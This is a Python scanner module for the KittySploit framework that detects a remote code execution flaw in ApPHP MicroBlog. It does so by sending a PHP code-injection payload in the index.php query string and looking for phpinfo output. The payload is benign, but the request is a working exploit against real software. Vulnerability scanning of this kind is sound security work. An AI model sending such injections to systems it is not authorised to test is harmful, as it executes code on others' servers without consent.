#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ApPHP MicroBlog index.php parameter RCE."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ApPHP MicroBlog - index.php RCE Detection',
        'description': (
            'Detects ApPHP MicroBlog RCE via index.php?b);phpinfo();echo(...)=/ style '
            'parameter injection.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'apphp', 'microblog', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/33019',
        ],
    }

    def run(self):
        for base in ('/blog', '', '/microblog'):
            probe = self.http_request(method='GET', path=f'{base}/index.php', allow_redirects=False)
            if not probe or 'ApPHP MicroBlog' not in (probe.text or ''):
                continue
            path = (
                f"{base}/index.php?b);phpinfo();echo(base64_decode('T3BlblZBUwo')=/"
            )
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and '<title>phpinfo()' in (r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='ApPHP MicroBlog RCE',
                    path=f'{base}/index.php',
                )
                return True
        return False
